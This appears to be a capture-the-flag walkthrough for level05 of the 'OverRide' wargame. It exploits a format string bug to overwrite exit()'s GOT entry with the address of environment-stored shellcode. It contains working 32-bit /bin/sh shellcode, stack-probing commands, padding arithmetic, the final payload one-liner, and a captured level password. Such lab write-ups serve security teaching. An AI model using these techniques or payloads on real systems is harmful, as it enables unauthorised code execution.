
# Walkthrough

**Main** : 
The binary reads the input from stdin and prints the same string after transforming the uppercase into lowercase then displaying the buffer with printf  
To exploit this program, we  provide input that enabling us to do a format string attack  that allowing  to replace the exit() address on the GOT  by  ours shell code which will be store in environement variable 
<br/>
The address of the shellcode transformed into the number of characters to print will be written in the 10th and 11th position in the stack and then replaces the address of exit with that of the shell code

**Process to exploit :**
>   1. **Find the needs address**
>   2. **Prepare Payload** 
>  3. **Load payload**


## Step 1

###  Find the needs address

 the idea is to replace the exit() relocation address in the GOT to target our shellcode 
 **Find exit address**
 ```
 gdb level05
disas exit
Dump of assembler code for function exit@plt:
 0x08048370 <+0>:	jmp    *0x80497e0
```

**Export shellcode as environnement variable**
To avoid the shell to be overwrite by the loop in the code i  shellcode as environnement variable

```
export SHELLCODE=`python -c 'print "\x90" * 50 + "\x6a\x0b\x58\x99\x52\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x31\xc9\xcd\x80"'`
```
**Find addres of shellcode**
We need to write in the exit GOT address in 2 times, because the address of shellcode in decimal is to big   to write in 1 time
```
#include <stdio.h>
#include <stdlib.h>

int main(int argc, char *argv[]) {
    printf("%p\n", getenv("SHELLCODE"));
    printf("%s\n", getenv("SHELLCODE"));
}

gcc -m32 addr.c && ./aout
0xffffd88e
```


## Step 2

### Prepare Payload


**Position of the buffer in the stack :**
```
level05@OverRide:~$ (python -c "print 'aaaa' + ' | %x' * 13") | ./level05
aaaa | 64 | f7fcfac0 | f7ec3af9 | ffffd66f | ffffd66e | 0 | ffffffff | ffffd6f4 | f7fdb000 | 61616161 | 25207c20 | 207c2078 | 7c207825
```
We can pass our 2 addresses at the start of our buffer form  $10 and $11 parameter indexes.

**Split address shellcode in decimal :**

  - `0xffffd88e` = `4294957231`
 - `ffff = 65535` 
 - `d88e = 55438`

 **Padding:**
-  55438 - 8 =  55430 ; value of  first padding
- 65535 - 55438 = 10097 ; value of second padding

d896 (55430 for our 2 addresses written before) + ffff (10097 )

**The payload will  be this format :** 

  exit addr 2 first bytes" + "exit addr 2 last bytes" + "%55430d" + "%10$hn" + "%10097d" + "%11$hn"

**Load payload:**
```
(python -c 'print("\xe0\x97\x04\x08" + "\xe2\x97\x04\x08" + "%55430d%10$hn" + "%10097d%11$hn")'; cat) | ./level05
whoami
level06
cat /home/users/level06/.pass
h4GtNnaMs2kZFN92ymTr2DcJHAzMfzLW25Ep59mq

```
